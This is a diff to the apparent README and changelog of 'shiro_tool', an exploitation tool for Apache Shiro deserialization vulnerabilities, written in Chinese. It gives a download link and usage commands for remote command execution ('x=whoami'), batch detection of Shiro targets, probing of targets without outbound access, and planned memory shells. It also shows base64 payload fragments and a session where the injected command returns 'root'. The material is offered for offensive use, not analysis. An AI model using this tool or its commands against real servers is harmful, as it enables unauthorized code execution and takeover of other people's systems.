@@ -2,13 +2,21 @@
 
 ```
 下载地址：https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip
+
+2020-10-16：
+放出来一些功能：
+1、spring/tomcat回显，执行命令的时候，x=whoami 就行
+2、批量检测是否shiro, java -cp shiro_tool.jar shiro.Check http://url 或者 java -cp shiro_tool.jar shiro.Check urls=文件
+3、目标服务器不出网的情况下探测
+
+其他：
+后面看情况再放出一些更通用的和内存shell
+
+
 2020-08-21: 
 新增了cc8 cc9 cc10利用链
 新增了输出payload模式，在执行命令的时候输入output=on即可。
 参考下面的示例
-
-下载地址：
-后期会更新一些多框架的回显的以及内存SHELL等等。
 
 
 2020-05-26:
@@ -83,6 +91,10 @@ uUeeaXwirEw2kg58GktvB2Ghw4egXJBQUdP3H8iE+zrkf12YlPs/RAOq8w0mWfvwB7EnCW3Z83YP8vV1
 SyUtUaEAAuMN9C30Rr+r7Tk9MVC55eS8l82fURpUwttcRADhJ0esKHAFFAkwnisbAb4Uugz3IADojYlH
 BNFtWFuV2dsuqkionEROKLIdVHJGR8URmk79v8lbLbpCWI3cTCf81SwwBoYylKXCyHX2X08VlEUvuHWk
 ypx9gVvDuQQQFTGP4ljwpU1NlQPqxaLXmnZ5TyJN2sycL9s8VWMYls4uFATtMkpXXcwaQGFVjCzFrABv
+[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
+> x=whoami
+root
+
 [-] please enter command, enter q or quit to quit, enter back to re-choose gadget
 > quit
 [-] start process command: quit
